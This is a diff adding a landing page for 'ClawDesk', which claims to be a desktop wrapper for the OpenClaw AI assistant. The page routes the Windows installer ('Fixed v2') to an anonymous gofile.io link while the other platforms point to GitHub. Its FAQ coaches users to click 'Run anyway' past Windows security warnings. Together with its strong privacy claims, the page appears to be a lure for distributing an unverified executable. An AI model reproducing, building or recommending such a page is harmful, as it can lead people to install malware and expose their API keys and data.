@@ -1,0 +1,653 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ClawDesk — OpenClaw for Everyone</title>
+    <meta name="description"
+        content="Download ClawDesk. Install once, run your personal AI assistant locally. Supports OpenAI, Claude, Gemini, Groq, Mistral, and more.">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg: #050505;
+            --card: #0a0a0a;
+            --card2: #0e0e0e;
+            --border: rgba(255, 255, 255, 0.06);
+            --text: #f0f0f0;
+            --text2: #888;
+            --text3: #555;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html {
+            scroll-behavior: smooth;
+        }
+
+        body {
+            font-family: 'Inter', system-ui, sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            line-height: 1.6;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        /* Nav */
+        nav {
+            position: fixed;
+            top: 0;
+            width: 100%;
+            z-index: 100;
+            padding: 16px 40px;
+            background: rgba(5, 5, 5, 0.85);
+            backdrop-filter: blur(12px);
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .nav-brand {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 16px;
+            font-weight: 700;
+            text-decoration: none;
+            color: var(--text);
+        }
+
+        .nav-brand svg {
+            width: 24px;
+            height: 24px;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 28px;
+        }
+
+        .nav-links a {
+            color: var(--text2);
+            text-decoration: none;
+            font-size: 14px;
+            transition: color .15s;
+        }
+
+        .nav-links a:hover {
+            color: var(--text);
+        }
+
+        /* Hero */
+        .hero {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            padding: 120px 24px 60px;
+        }
+
+        .hero-badge {
+            display: inline-block;
+            padding: 6px 16px;
+            border-radius: 20px;
+            background: rgba(255, 255, 255, 0.04);
+            border: 1px solid var(--border);
+            color: var(--text3);
+            font-size: 12px;
+            font-weight: 500;
+            margin-bottom: 32px;
+        }
+
+        .hero h1 {
+            font-size: clamp(36px, 6vw, 64px);
+            font-weight: 700;
+            letter-spacing: -1.5px;
+            line-height: 1.1;
+            max-width: 640px;
+        }
+
+        .hero p {
+            color: var(--text2);
+            font-size: 18px;
+            margin-top: 20px;
+            max-width: 480px;
+        }
+
+        .hero-actions {
+            margin-top: 40px;
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+
+        .btn {
+            padding: 14px 32px;
+            border-radius: 12px;
+            font-size: 15px;
+            font-weight: 600;
+            text-decoration: none;
+            transition: all .15s;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            border: none;
+            cursor: pointer;
+            font-family: inherit;
+        }
+
+        .btn-white {
+            background: #f0f0f0;
+            color: #0a0a0a;
+        }
+
+        .btn-white:hover {
+            background: #fff;
+        }
+
+        .btn-ghost {
+            background: transparent;
+            color: var(--text2);
+            border: 1px solid var(--border);
+        }
+
+        .btn-ghost:hover {
+            color: var(--text);
+            border-color: rgba(255, 255, 255, 0.12);
+        }
+
+        /* Features */
+        .features {
+            padding: 60px 24px;
+            max-width: 900px;
+            margin: 0 auto;
+        }
+
+        .features h2 {
+            text-align: center;
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 40px;
+            letter-spacing: -0.5px;
+        }
+
+        .feature-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 16px;
+        }
+
+        .feature-card {
+            padding: 28px 24px;
+            border-radius: 16px;
+            background: var(--card);
+            border: 1px solid var(--border);
+        }
+
+        .feature-card h3 {
+            font-size: 15px;
+            font-weight: 600;
+            margin-bottom: 6px;
+        }
+
+        .feature-card p {
+            color: var(--text3);
+            font-size: 13px;
+        }
+
+        /* Providers */
+        .providers {
+            padding: 60px 24px;
+            max-width: 700px;
+            margin: 0 auto;
+            text-align: center;
+        }
+
+        .providers h2 {
+            font-size: 22px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            letter-spacing: -0.3px;
+        }
+
+        .providers .sub {
+            color: var(--text3);
+            font-size: 14px;
+            margin-bottom: 32px;
+        }
+
+        .provider-list {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            justify-content: center;
+        }
+
+        .provider-tag {
+            padding: 8px 18px;
+            border-radius: 10px;
+            background: var(--card);
+            border: 1px solid var(--border);
+            color: var(--text2);
+            font-size: 13px;
+            font-weight: 500;
+        }
+
+        /* Steps */
+        .steps {
+            padding: 60px 24px;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+
+        .steps h2 {
+            text-align: center;
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 40px;
+            letter-spacing: -0.5px;
+        }
+
+        .step-list {
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+
+        .step {
+            display: flex;
+            gap: 20px;
+            align-items: flex-start;
+            padding: 24px;
+            background: var(--card);
+            border-radius: 16px;
+            border: 1px solid var(--border);
+        }
+
+        .step-num {
+            width: 36px;
+            height: 36px;
+            border-radius: 10px;
+            background: rgba(255, 255, 255, 0.04);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 14px;
+            color: var(--text2);
+            flex-shrink: 0;
+        }
+
+        .step h3 {
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 4px;
+        }
+
+        .step p {
+            color: var(--text3);
+            font-size: 14px;
+        }
+
+        /* Security */
+        .security {
+            padding: 60px 24px;
+            max-width: 700px;
+            margin: 0 auto;
+            text-align: center;
+        }
+
+        .security h2 {
+            font-size: 22px;
+            font-weight: 700;
+            margin-bottom: 12px;
+            letter-spacing: -0.3px;
+        }
+
+        .security p {
+            color: var(--text3);
+            font-size: 14px;
+            max-width: 500px;
+            margin: 0 auto;
+        }
+
+        .security-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 12px;
+            margin-top: 28px;
+        }
+
+        .sec-item {
+            padding: 20px 16px;
+            border-radius: 14px;
+            background: var(--card);
+            border: 1px solid var(--border);
+        }
+
+        .sec-item h4 {
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 4px;
+        }
+
+        .sec-item p {
+            font-size: 12px;
+        }
+
+        /* Download */
+        .download {
+            padding: 80px 24px;
+            max-width: 700px;
+            margin: 0 auto;
+            text-align: center;
+        }
+
+        .download h2 {
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 12px;
+            letter-spacing: -0.5px;
+        }
+
+        .download .sub {
+            color: var(--text3);
+            font-size: 14px;
+            margin-bottom: 32px;
+        }
+
+        .download-grid {
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+
+        .dl-btn {
+            padding: 16px 28px;
+            border-radius: 14px;
+            background: var(--card);
+            border: 1px solid var(--border);
+            color: var(--text);
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 600;
+            transition: all .15s;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 4px;
+            min-width: 160px;
+        }
+
+        .dl-btn:hover {
+            border-color: rgba(255, 255, 255, 0.15);
+            background: var(--card2);
+        }
+
+        .dl-btn small {
+            color: var(--text3);
+            font-size: 11px;
+            font-weight: 400;
+        }
+
+        /* FAQ */
+        .faq {
+            padding: 60px 24px;
+            max-width: 700px;
+            margin: 0 auto;
+        }
+
+        .faq h2 {
+            text-align: center;
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 40px;
+            letter-spacing: -0.5px;
+        }
+
+        .faq-item {
+            border-bottom: 1px solid var(--border);
+            padding: 20px 0;
+        }
+
+        .faq-item h3 {
+            font-size: 15px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+
+        .faq-item p {
+            color: var(--text3);
+            font-size: 14px;
+        }
+
+        /* Footer */
+        footer {
+            padding: 40px 24px;
+            text-align: center;
+            border-top: 1px solid var(--border);
+            margin-top: 40px;
+        }
+
+        footer p {
+            color: var(--text3);
+            font-size: 13px;
+        }
+
+        footer a {
+            color: var(--text2);
+            text-decoration: none;
+        }
+
+        footer a:hover {
+            color: var(--text);
+        }
+
+        @media (max-width: 640px) {
+
+            .feature-grid,
+            .security-grid {
+                grid-template-columns: 1fr;
+            }
+
+            nav {
+                padding: 12px 20px;
+            }
+
+            .nav-links {
+                display: none;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <nav>
+        <a href="#" class="nav-brand">
+            <svg viewBox="0 0 40 40" fill="none">
+                <path d="M8 28 L14 12 L20 22 L26 12 L32 28" stroke="#fff" stroke-width="2.5" stroke-linecap="round"
+                    stroke-linejoin="round" />
+                <circle cx="20" cy="32" r="2" fill="#fff" opacity=".3" />
+            </svg>
+            ClawDesk
+        </a>
+        <div class="nav-links">
+            <a href="#features">Features</a>
+            <a href="#how">How it works</a>
+            <a href="#download">Download</a>
+            <a href="#faq">FAQ</a>
+            <a href="https://github.com/openclaw/openclaw" target="_blank">OpenClaw</a>
+        </div>
+    </nav>
+
+    <section class="hero">
+        <span class="hero-badge">Powered by OpenClaw · MIT Licensed</span>
+        <h1>Your AI assistant,<br>one install away</h1>
+        <p>ClawDesk wraps OpenClaw into a desktop app. No terminal. No config files. Download, enter your API key, and
+            go.</p>
+        <div class="hero-actions">
+            <a href="https://github.com/clawdesk/clawdesk/releases/latest" class="btn btn-white">
+                ↓ Download
+            </a>
+            <a href="https://github.com/clawdesk/clawdesk" class="btn btn-ghost">
+                View source
+            </a>
+        </div>
+    </section>
+
+    <section class="features" id="features">
+        <h2>Built for simplicity</h2>
+        <div class="feature-grid">
+            <div class="feature-card">
+                <h3>100% Local</h3>
+                <p>Everything runs on your machine. No servers. No middlemen. Your data never leaves your computer.</p>
+            </div>
+            <div class="feature-card">
+                <h3>Any Provider</h3>
+                <p>OpenAI, Claude, Gemini, Groq, Mistral, DeepSeek, xAI, or any OpenAI-compatible endpoint.</p>
+            </div>
+            <div class="feature-card">
+                <h3>Zero Dependencies</h3>
+                <p>Everything is bundled. No Node.js or terminal required. Just download and start chatting instantly.
+                </p>
+            </div>
+        </div>
+    </section>
+
+    <section class="providers">
+        <h2>Works with your favorite models</h2>
+        <p class="sub">ClawDesk supports every provider that OpenClaw supports</p>
+        <div class="provider-list">
+            <span class="provider-tag">OpenAI</span>
+            <span class="provider-tag">Anthropic</span>
+            <span class="provider-tag">OpenRouter</span>
+            <span class="provider-tag">Google Gemini</span>
+            <span class="provider-tag">Groq</span>
+            <span class="provider-tag">Mistral</span>
+            <span class="provider-tag">xAI (Grok)</span>
+            <span class="provider-tag">DeepSeek</span>
+            <span class="provider-tag">Together</span>
+            <span class="provider-tag">Ollama</span>
+            <span class="provider-tag">Custom API</span>
+        </div>
+    </section>
+
+    <section class="steps" id="how">
+        <h2>Get started in 60 seconds</h2>
+        <div class="step-list">
+            <div class="step">
+                <div class="step-num">1</div>
+                <div>
+                    <h3>Install ClawDesk</h3>
+                    <p>Download the installer and run it. ClawDesk handles everything — OpenClaw is set up
+                        automatically.</p>
+                </div>
+            </div>
+            <div class="step">
+                <div class="step-num">2</div>
+                <div>
+                    <h3>Pick your provider & enter your key</h3>
+                    <p>Choose any AI provider and paste your API key. That's all the configuration needed.</p>
+                </div>
+            </div>
+            <div class="step">
+                <div class="step-num">3</div>
+                <div>
+                    <h3>Start chatting</h3>
+                    <p>Your AI assistant runs locally, stays in your system tray, and starts with your computer.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="security">
+        <h2>Private by design</h2>
+        <p>ClawDesk runs entirely on your machine. No telemetry. No analytics. No cloud.</p>
+        <div class="security-grid">
+            <div class="sec-item">
+                <h4>Loopback Only</h4>
+                <p>Gateway binds to 127.0.0.1. No network exposure.</p>
+            </div>
+            <div class="sec-item">
+                <h4>Zero Telemetry</h4>
+                <p>No data sent anywhere. No tracking. No analytics.</p>
+            </div>
+            <div class="sec-item">
+                <h4>Open Source</h4>
+                <p>Full source on GitHub. Audit every line yourself.</p>
+            </div>
+        </div>
+    </section>
+
+    <section class="download" id="download">
+        <h2>Download ClawDesk</h2>
+        <p class="sub">Free and open source. MIT licensed.</p>
+        <div class="download-grid">
+            <a href="https://gofile.io/d/rCEAYH" class="dl-btn" target="_blank">
+                Windows
+                <small>.exe Installer (Fixed v2)</small>
+            </a>
+            <a href="https://github.com/clawdesk/clawdesk/releases/latest" class="dl-btn">
+                Linux
+                <small>.AppImage / .deb</small>
+            </a>
+            <a href="https://github.com/clawdesk/clawdesk/releases/latest" class="dl-btn">
+                macOS
+                <small>.dmg</small>
+            </a>
+        </div>
+    </section>
+
+    <section class="faq" id="faq">
+        <h2>FAQ</h2>
+        <div class="faq-item">
+            <h3>Why does Windows show a security warning?</h3>
+            <p>ClawDesk is not yet code-signed with an Extended Validation certificate. Click "More info" → "Run anyway"
+                to proceed. SHA256 checksums are published with every release for verification.</p>
+        </div>
+        <div class="faq-item">
+            <h3>What is OpenClaw?</h3>
+            <p>OpenClaw is an open-source personal AI assistant (MIT license, 1,000+ contributors). ClawDesk wraps it
+                into a desktop app so you don't need a terminal.</p>
+        </div>
+        <div class="faq-item">
+            <h3>Is my data private?</h3>
+            <p>Yes. OpenClaw runs locally. Your API keys and conversations stay on your machine. ClawDesk has no servers
+                — nothing is sent to us.</p>
+        </div>
+        <div class="faq-item">
+            <h3>Do I need Node.js?</h3>
+            <p>No. ClawDesk now comes fully bundled with its own runtime. You don't need to install Node.js, Git, or
+                anything else to use it.</p>
+        </div>
+        <div class="faq-item">
+            <h3>Can I use self-hosted models?</h3>
+            <p>Yes. Select "Custom" as your provider and enter your endpoint URL (e.g., Ollama, vLLM, or any
+                OpenAI-compatible API).</p>
+        </div>
+        <div class="faq-item">
+            <h3>Does ClawDesk start with my computer?</h3>
+            <p>Optional. Right-click the tray icon → enable "Start with Windows". ClawDesk will boot silently and keep
+                your AI ready in the background.</p>
+        </div>
+    </section>
+
+    <footer>
+        <p>
+            ClawDesk is MIT licensed · Wraps <a href="https://github.com/openclaw/openclaw">OpenClaw</a> (MIT, © 2025
+            Peter Steinberger)
+        </p>
+    </footer>
+</body>
+
+</html>
